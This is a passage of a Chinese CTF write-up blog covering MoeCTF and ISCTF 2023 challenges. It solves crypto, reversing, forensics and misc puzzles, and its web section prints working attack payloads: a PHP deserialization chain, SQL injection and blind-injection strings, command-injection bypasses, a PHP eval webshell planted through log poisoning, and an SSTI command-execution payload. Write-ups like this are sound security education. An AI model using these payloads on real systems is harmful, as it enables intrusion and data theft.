型）</p><p><a href="http://www.metools.info/code/fence154.html">栅栏在线</a></p><p><img src="https://s2.loli.net/2024/03/08/DU59WR8axu12EdK.png" alt=""></p><p><strong>moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj}</strong></p><h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h3><p>   凯撒密码</p><p>7 位</p><p><img src="https://s2.loli.net/2024/03/08/E32FrNSt4xOkW7g.png" alt=""></p><p><strong>moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To}</strong></p><h3 id="不是”皇帝的新密码”"><a href="#不是”皇帝的新密码”" class="headerlink" title="不是”皇帝的新密码”"></a>不是”皇帝的新密码”</h3><p>维吉尼亚密码</p><blockquote><p>前面皇帝的新密码指的是凯撒，而现在又要扯到他，指明不是凯撒，那很有可能是其的延伸维吉尼亚</p></blockquote><p>先拿 moectf 试下</p><p><img src="https://s2.loli.net/2024/03/08/weOsTEhARKLxoti.png" alt=""></p><p><strong>猜测goodjob为key</strong></p><p><img src="https://s2.loli.net/2024/03/08/V7WzY4wU2c3s9mB.png" alt=""></p><p><strong>moectf{vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz}</strong></p><h3 id="Reverse-入门指北"><a href="#Reverse-入门指北" class="headerlink" title="Reverse 入门指北"></a>Reverse 入门指北</h3><p>IDA 反编译</p><p>exe 文件放入 ida64 中</p><p><img src="https://s2.loli.net/2024/03/08/5ACDIZu237WaRqd.png" alt=""></p><p><strong>找到main函数F5反编译成c语言即可</strong></p><p><strong>moectf{F1rst_St3p_1s_D0ne}</strong></p><h3 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h3><p>linux 基础命令</p><p>一开始给 localhost（127.0.0.1）地址的话虚拟机 nc 不了</p><p>听 m 神，给了个 0.0.0.0 的地址，然后先 <code>ip addr | grep 192.</code> 查询了自己的 ip</p><p>然后 nc 自己的 ip 端口 就可以登了</p><p><img src="https://s2.loli.net/2024/03/08/1kQY6Z4ruSygdOf.png" alt=""></p><p>ls 看到有 gift，试试 cat 一下</p><p><img src="https://s2.loli.net/2024/03/08/WKDMLbZwV6JNTFp.png" alt=""></p><blockquote><p>我的 linux 语言基础太弱了捏</p></blockquote><p><img src="https://s2.loli.net/2024/03/08/u5n1wtAymLrVHPR.png" alt=""></p><p><strong>Ls -a查下所有文件</strong></p><p><img src="https://s2.loli.net/2024/03/08/52LUGIbqaVzcjBl.png" alt=""></p><p>看到隐藏的 flag 了，再 cat 就行</p><p><strong>moectf{Dsa-vTzMEdclL0G6gDkH4NXfAcvGsR_g}</strong></p><h3 id="ai-入门指北"><a href="#ai-入门指北" class="headerlink" title="ai 入门指北"></a>ai 入门指北</h3><p>   Torch 安装命令</p><p><strong>moectf{install_torch_torchvision_torchaudio}</strong></p><h3 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h3><p>异或运算</p><p>拿到题目找到 main 函数 F5 反编译</p><p><img src="https://s2.loli.net/2024/03/08/7VWfacCL9tn5ARl.png" alt=""></p><p>解读代码，要求 enc[]=input[]异或 0x39，而 input 就是 flag 的内容</p><p>双击 enc 找到其位置</p><p><img src="https://s2.loli.net/2024/03/08/rFw3hk7IfcEeS2U.png" alt=""></p><p>shift+e 提取出来</p><p><img src="https://s2.loli.net/2024/03/08/WVkMETg5qUaAv2N.png" alt=""></p><p>这是 enc[]数组里的值，我们只需要把原代码逆过来求用户应该输入的 flag 值即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123;</span><br><span class="line">        <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x5C</span>, <span class="number">0x5A</span>, <span class="number">0x4D</span>, <span class="number">0x5F</span>, <span class="number">0x42</span>, <span class="number">0x60</span>,</span><br><span class="line">        <span class="number">0x56</span>, <span class="number">0x4C</span>, <span class="number">0x66</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x09</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x09</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>, <span class="number">0x4D</span>, <span class="number">0x09</span>, <span class="number">0x66</span>, <span class="number">0x61</span>,</span><br><span class="line">        <span class="number">0x09</span>, <span class="number">0x6B</span>, <span class="number">0x18</span>, <span class="number">0x44</span></span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">28</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i) &#123;</span><br><span class="line">        input[i] = (enc[i] ^ <span class="number">0x39</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02X&quot;</span>, input[i]);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">27</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/a4q2u1QegcL5dfE.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/mo6KqEuWaAZyXMN.png" alt=""></p><p><strong>moectf{You_kn0w_h0w_t0_X0R!}</strong></p><h3 id="喵言喵语"><a href="#喵言喵语" class="headerlink" title="喵言喵语"></a>喵言喵语</h3><p>摩斯密码</p><p><img src="https://s2.loli.net/2024/03/08/mSLWVApziKXjn2Z.png" alt=""></p><p><strong>喵喵？作为-<br>喵喵喵为.</strong></p><p><img src="https://s2.loli.net/2024/03/08/WMEHSqIQfGF6Anz.png" alt=""></p><p><strong>moectf{THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX}</strong></p><h3 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h3><p>取证</p><p>下载附件</p><p><img src="https://s2.loli.net/2024/03/08/5wpbltBdJykv9EC.png" alt=""></p><p><strong>左下添加一个硬盘，选择附件文件，别的操作不动即可</strong></p><p><img src="https://s2.loli.net/2024/03/08/N1DV2Rv7zFb6fgo.png" alt=""></p><p><strong>开机后发现两个盘，一个加密一个未加密，从未加密的盘里找到 key 再去解密加密盘即可</strong></p><p><img src="https://s2.loli.net/2024/03/08/NUTCXM8tokguyE2.png" alt=""></p><p>$RECYCLE.BIN/S-1-5-21-3152099865-1651255762-3118541945-500/$RMJ65VN.TXT</p><p>此处找到密码</p><p><img src="https://s2.loli.net/2024/03/08/Ee1gP6ywsWAUMxJ.png" alt=""></p><p>把密码给到第一个盘解密后打开</p><p><img src="https://s2.loli.net/2024/03/08/ve5QH9dltNAfm76.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/DLMuUqgXEVcNobk.png" alt=""></p><p>base64 解密</p><p><img src="https://s2.loli.net/2024/03/08/JHN8jhp3To5gD6X.png" alt=""></p><p><strong>moectf{Bas1c_D15k_F0r3ns1cs!}</strong></p><h3 id="Jail-Level-0"><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h3><p>   python 知识</p><p>题目：eval(用户输入)</p><p>这里尝试直接读取 flag</p><p><img src="https://s2.loli.net/2024/03/08/ojNYIhl7KwmLWXy.png" alt=""></p><p>和今年国赛初赛的签到题一样的，只不过 flag 不在根目录就在当前目录</p><p><img src="https://s2.loli.net/2024/03/08/cBWumawOLH2jTrn.png" alt=""></p><p><strong>print(open(‘flag’).read())</strong></p><p><strong>flag{dR6GEZKWSwldDRfgEiPr-_moppEM_U20}</strong></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF 2023</title>
      <link href="/posts/ISCTF2023%5B3%5D.html"/>
      <url>/posts/ISCTF2023%5B3%5D.html</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争!!!"></a>圣杯战争!!!</h3><p>php 反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$excalibuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arrow</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;为Saber选择了对的武器!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;excalibuer-&gt;arrow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$release</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$functioin</span> = <span class="variable language_">$this</span>-&gt;release;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;蓄力!咖喱棒！！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$functioin</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weapon</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;胜利！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;weapon);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Saber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Rider</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;开始召唤从者！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Saber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>POP 链：summon-&gt;artifact-&gt;prepare-&gt;saber</strong></p><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$excalibuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arrow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$release</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weapon</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Saber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Rider</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$artifact</span>=<span class="keyword">new</span> <span class="title function_ invoke__">artifact</span>();</span><br><span class="line"><span class="variable">$prepare</span>=<span class="keyword">new</span> <span class="title function_ invoke__">prepare</span>();</span><br><span class="line"><span class="variable">$saber</span>=<span class="keyword">new</span> <span class="title function_ invoke__">saber</span>();</span><br><span class="line"><span class="variable">$summon</span>=<span class="keyword">new</span> <span class="title function_ invoke__">summon</span>();</span><br><span class="line"><span class="variable">$summon</span>-&gt;Saber=<span class="variable">$artifact</span>;</span><br><span class="line"><span class="variable">$artifact</span>-&gt;excalibuer=<span class="variable">$prepare</span>;</span><br><span class="line"><span class="variable">$prepare</span>-&gt;release=<span class="variable">$saber</span>;</span><br><span class="line"><span class="variable">$saber</span>-&gt;weapon=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$summon</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>?payload=O:6:”summon”:2:{s:5:”Saber”;O:8:”artifact”:2:{s:10:”excalibuer”;O:7:”prepare”:1:{s:7:”release”;O:5:”saber”:1:{s:6:”weapon”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;}}s:5:”arrow”;N;}s:5:”Rider”;N;}</strong></p><h3 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h3><p>rce</p><p>当前目录下一个</p><p><img src="https://s2.loli.net/2024/03/07/T37YuLFAjGsdvgC.png" alt=""></p><p>根目录下一个</p><p><img src="https://s2.loli.net/2024/03/07/9Xjx8ucktANGh6D.png" alt=""></p><p>环境变量里一个</p><p><img src="https://s2.loli.net/2024/03/07/9ZrGKBpFCe8PET1.png" alt=""></p><h3 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里"></a>绕进你的心里</h3><p>md5 绕过，正则回溯绕过</p><p><img src="https://s2.loli.net/2024/03/07/kIx6KeibftYzADa.png" alt=""></p><p><strong>md5和第一个preg都用数组绕过<br>然后第二个preg和strpos组合的话用正则回溯绕过</strong></p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">&quot;pan_gu&quot;</span>:<span class="string">&quot;a&quot;</span>*<span class="number">1000000</span>+<span class="string">&quot;2023ISCTF&quot;</span>&#125;</span><br><span class="line">url=<span class="string">&quot;http://43.249.195.138:22110/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=a&quot;</span></span><br><span class="line">res = requests.post(data=data,url=url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/SMP2VWHLE8nZ47r.png" alt=""></p><h3 id="easy-website"><a href="#easy-website" class="headerlink" title="easy_website"></a>easy_website</h3><p>sql 注入</p><blockquote><p>同款题：[SWPUCTF 2022 新生赛]ez_sql</p></blockquote><p>过滤 or select 用双写绕过</p><p>空格用/**/绕过</p><p>查当前库</p><p><img src="https://s2.loli.net/2024/03/07/3plwOIZF4ygvMR5.png" alt=""></p><p>查当前库下的表</p><p><img src="https://s2.loli.net/2024/03/07/CBw7UXKL5e6kDYG.png" alt=""></p><p>列出全部列的内容，最后发现是 password 里有 flag</p><p>payload：<br><strong><br>POST:<br>username=0’/**/uunionnion/**/sselectelect/**/group_concat(passwoorrd)/**/from/**/users.users/**/#&amp;password=</strong></p><p><img src="https://s2.loli.net/2024/03/07/W5tbjLHzCDcqh97.png" alt=""></p><h3 id="Wafr"><a href="#Wafr" class="headerlink" title="Wafr"></a>Wafr</h3><p>RCE</p><p><img src="https://s2.loli.net/2024/03/07/zNRsZE8wtJ3TQMr.png" alt=""></p><p><strong>payload：<br>POST：<br>code=system(‘ca\t /f*’)%0a</strong></p><h3 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h3><p>逆向算法，伪协议</p><p>打开就要参数</p><p><img src="https://s2.loli.net/2024/03/07/n9dCMHXQZlzOgSB.png" alt=""></p><p>dirsearch 扫下备份文件</p><p><img src="https://s2.loli.net/2024/03/07/A3noeDOUgtcBLaJ.png" alt=""></p><p>下载 index.bak 查看源码</p><p><img src="https://s2.loli.net/2024/03/07/2XjCdLoy5Il3Ot7.png" alt=""></p><p>定义了两个函数，并且利用这两个函数对原本的参数名进行了加密处理</p><p>最后加密结果为 dxdydxdudxdtdxeadxekdxea</p><p>写个逆向脚本再反求 parameter 即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hash = <span class="string">&#x27;dxdydxdudxdtdxeadxekdxea&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">string_to_int_array</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> intArr = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    intArr.<span class="title function_">push</span>(str.<span class="title function_">charCodeAt</span>(i) - <span class="number">97</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> intArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">int_array_to_string</span>(<span class="params">int_array</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; int_array.<span class="property">length</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> charcode = int_array[i] * <span class="number">26</span> + int_array[i + <span class="number">1</span>];</span><br><span class="line">    str += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(charcode);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">int_array_to_string</span>(<span class="title function_">string_to_int_array</span>(<span class="title function_">int_array_to_string</span>(<span class="title function_">string_to_int_array</span>(hash)))));</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/gulBGwbQrzPZAFn.png" alt=""></p><p>得到参数名:mihoyo</p><p><strong>?mihoyo=php://filter/read=convert.base64-encode/resource=flag.php</strong></p><p>伪协议直接读，解码 base64 即可</p><h3 id="ez-ini"><a href="#ez-ini" class="headerlink" title="ez_ini"></a>ez_ini</h3><p>文件上传  .user.ini</p><p>上传.user.ini 文件</p><pre><code>GIF89Aauto_append_file=&quot;/var/log/nginx/access.log&quot;</code></pre><p>UA 头添加木马：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);?</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/dXTVW1RfPrceQ6H.png" alt=""></p><p><strong>POST:<br>shell=system(‘tac /flag’);</strong></p><p><img src="https://s2.loli.net/2024/03/07/6f4buS1pxIn8ad2.png" alt=""></p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz!"></a>fuzz!</h3><p>fuzz RCE</p><p><img src="https://s2.loli.net/2024/03/07/G5jpt7KPxRogcIS.png" alt=""></p><p>flag 在/flaggggggg.txt 中，要 bypass</p><p>fuzz 脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">32</span>; <span class="variable">$i</span> &lt; <span class="number">129</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\&quot;|\;|\&lt;|\&gt;|\,|\?|jay/i&quot;</span>, <span class="variable">$i</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/07/6y2YwifRMZArQXm.png" alt=""></p><p><strong>排除数字和字母后只剩以下符号可用<br>-./:[]{|} 空格</strong></p><p>“|”没 ban，可以放在开头结束前面的 curl，然后拼接我们自己的系统命令</p><p>flag 关键字过滤可以用”[]”正则匹配绕过</p><p><strong>paylaod：<br>?file=|tac /fl[a-z]ggggggg.txt</strong></p><p><img src="https://s2.loli.net/2024/03/07/1qItky4BCg7GJHe.png" alt=""></p><h3 id="1z-Ssql"><a href="#1z-Ssql" class="headerlink" title="1z_Ssql"></a>1z_Ssql</h3><p>布尔盲注</p><p><img src="https://s2.loli.net/2024/03/07/uZfO2QxI7wGaErc.png" alt=""></p><p>先摸索了一下，发现 union 和=号过滤</p><p>过滤等于号，改用 &gt; 号即可</p><p>union 过滤就用不了联合查询注入了，考虑布尔盲注</p><p><strong>admin’ and length(database()) &gt; 1#爆破当前数据库长度</strong></p><p><img src="https://s2.loli.net/2024/03/07/ayCFQdEWUMjJ9LH.png" alt=""></p><p>爆到 6 报错，说明当前数据库长度为 6</p><p>继续爆库名</p><p>从第一位开始，从 a 字母开始</p><p><strong>admin’ and substr(database(),1,1) &gt; ‘b’ #第一位为b<br>admin’ and substr(database(),2,1) &gt; ‘t’ #第二位为t</strong></p><p>后面爆出当前库名字就是出题人名字：<strong>bthcls</strong></p><p>附件拿到两个字典，应该是表和列的，使用 bp 来爆破</p><p><strong>admin’ and substr((select §xx§ from bthcls.§xx§ limit 0,1),1,1)&gt;’a’ #</strong></p><p><img src="https://s2.loli.net/2024/03/07/Ed6bmg59KJwAvux.png" alt=""></p><p>根据返回长度找到对应表 列</p><p><img src="https://s2.loli.net/2024/03/07/eahXgWJVBZPMFmj.png" alt=""></p><p>得到 <strong>bthcls.users.password 有值</strong></p><p>爆数据，字典为 32-127 纯数字（可打印字符的 ascii 十进制值）</p><p><strong>admin’and ascii(substr((select group_concat(password)from bthcls.users limit 0,1),1,1))&gt;§32§ #</strong></p><p><img src="https://s2.loli.net/2024/03/07/VwDmhk4XSsIZPb1.png" alt=""></p><p>得到第一位的 asciii 码十进制为 119</p><p>后续相同操作一直爆，最后爆出完整密码：119 101 49 99 111 109 101 55 111 49 115 99 116 102</p><p>对应字符：<strong>we1come7o1sctf</strong></p><p><strong>账号：admin<br>密码：we1come7o1sctf</strong></p><p><img src="https://s2.loli.net/2024/03/07/gGfXvAlykiY3UIz.png" alt=""></p><h3 id="恐怖-G7-人"><a href="#恐怖-G7-人" class="headerlink" title="恐怖 G7 人"></a>恐怖 G7 人</h3><p>ssti</p><p>无过滤 ssti，直接注入，flag 在环境变量里</p><pre><code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("__import__('os').popen('env').read()")&#125;&#125;</code></pre><p><img src="https://s2.loli.net/2024/03/07/doZmUc3WY6glCIi.png" alt=""></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>二维码拼接</p><p><img src="https://s2.loli.net/2024/03/07/pone3zbMPx1Zk5r.png" alt=""></p><p>附件拿到 PS 拼接</p><p><img src="https://s2.loli.net/2024/03/07/MepqBQ1ImKv48Ok.png" alt=""></p><p>扫码回复题目要求信息即可得到 flag</p><h3 id="杰伦可是流量明星"><a href="#杰伦可是流量明星" class="headerlink" title="杰伦可是流量明星"></a>杰伦可是流量明星</h3><p>流量分析</p><p>拿到 mp3 文件，binwalk 出一个压缩包</p><p><img src="https://s2.loli.net/2024/03/07/qk3dYbD72gAatIm.png" alt=""></p><p>wireshark 打开</p><p>在 tcp.stream eq 2 中找到 flag</p><p><img src="https://s2.loli.net/2024/03/07/yVDqCJQUuocOKPS.png" alt=""></p><h3 id="你说爱我？尊嘟假嘟"><a href="#你说爱我？尊嘟假嘟" class="headerlink" title="你说爱我？尊嘟假嘟"></a>你说爱我？尊嘟假嘟</h3><p>Ook! base64</p><p><img src="https://s2.loli.net/2024/03/07/YxqJadjny5iUP6g.png" alt=""></p><p>你说爱我替换为 Ook.</p><p>尊嘟替换为 Ook!</p><p>假嘟替换为 Ook?</p><p><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>解得：</p><p><strong>ild3l4pXejwPcCwJsPAOq7sJczdRdTsJcCEUsP1Z</strong></p><p>再 base64 解密</p><p><img src="https://s2.loli.net/2024/03/07/FCwidI4jy5BL3GN.png" alt=""></p><h3 id="easy-zip"><a href="#easy-zip" class="headerlink" title="easy_zip"></a>easy_zip</h3><p>密码爆破</p><p>6 位数字爆破密码即可</p><p><img src="https://s2.loli.net/2024/03/07/8vNeXgDqyKuzhRo.png" alt=""></p><h3 id="蓝鲨的福利"><a 